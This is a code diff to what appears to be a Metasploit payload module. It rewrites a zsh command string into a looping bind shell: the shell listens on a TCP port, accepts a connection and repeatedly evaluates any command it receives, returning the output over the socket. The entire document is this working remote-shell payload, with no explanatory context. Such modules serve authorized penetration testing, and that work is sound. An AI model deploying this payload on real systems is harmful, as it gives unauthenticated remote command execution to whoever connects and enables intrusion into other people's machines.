@@ -49,7 +49,11 @@ module Metasploit4
 	# Returns the command string to use for execution
 	#
 	def command_string
-        "zmodload zsh/net/tcp;ztcp -l #{datastore['LPORT']};listenfd=$REPLY;ztcp -a $listenfd;read -r cmd <&$REPLY;eval ${cmd} >&$REPLY"
+		cmd = "zmodload zsh/net/tcp;"
+		cmd << "ztcp -l #{datastore['LPORT']};"
+		cmd << "listenfd=$REPLY;"
+		cmd << "ztcp -a $listenfd;"
+		cmd << "while [ $REPLY ];do read -r cmd <&$REPLY;eval ${cmd} >&$REPLY;done"
+		cmd
 	end
-
 end
